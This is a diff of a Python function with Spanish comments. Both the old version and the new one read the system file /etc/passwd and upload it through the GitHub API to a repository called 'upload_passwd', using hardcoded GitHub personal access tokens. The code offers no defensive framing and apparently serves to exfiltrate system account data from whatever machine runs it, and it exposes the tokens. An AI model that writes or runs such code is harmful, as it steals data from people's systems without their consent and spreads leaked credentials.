@@ -1,26 +1,35 @@
 def run():
+  import requests
   
-  from github import Github
-  import os
+  token = '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'
+  repo_owner = 'Oxitocinaa'
+  repo_name = 'upload_passwd'
+  file_path = '/etc/passwd'
+  branch = 'main'  
   
-  token = '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'
-  usuario = 'Oxitocinaa'
-  repositorio = 'upload_passwd'
-
-  archivo_local = '/etc/passwd.txt'
-
-  rama = 'main'
-
-  # Crea una instancia de la clase Github con tu token
-  g = Github(token)
-  print("instancia en github creada")
+  # URL de la API de GitHub para crear un archivo
+  url = f'https://api.github.com/repos/{repo_owner}/{repo_name}/contents/{file_path}'
   
-  # Obtiene el repositorio
-  repo = g.get_user(usuario).get_repo(repositorio)
-
-  # Sube el archivo al repositorio
-  with open(archivo_local, 'rb') as archivo:
-    contenido = archivo.read()
-    repo.create_file(archivo_local, f"Commit desde script", contenido, branch=rama)
-
-  print(f"Archivo '{archivo_local}' subido exitosamente a la rama '{rama}' en el repositorio '{repositorio}'.")
+  # Carga el contenido del archivo local
+  with open(file_path, 'rb') as file:
+      file_content = file.read()
+  
+  # Prepara los datos para la solicitud HTTP
+  data = {
+      'message': 'Subir archivo desde script de Python',
+      'content': file_content,
+      'branch': branch
+  }
+  
+  # Configura las cabeceras con el token de acceso personal
+  headers = {
+      'Authorization': f'token {token}'
+  }
+  
+  # Realiza la solicitud POST para subir el archivo
+  response = requests.put(url, json=data, headers=headers)
+  
+  if response.status_code == 201:
+      print(f'Archivo "{file_path}" subido exitosamente a la rama "{branch}" en el repositorio "{repo_name}".')
+  else:
+      print(f'Error al subir el archivo: {response.status_code} - {response.json()["message"]}')
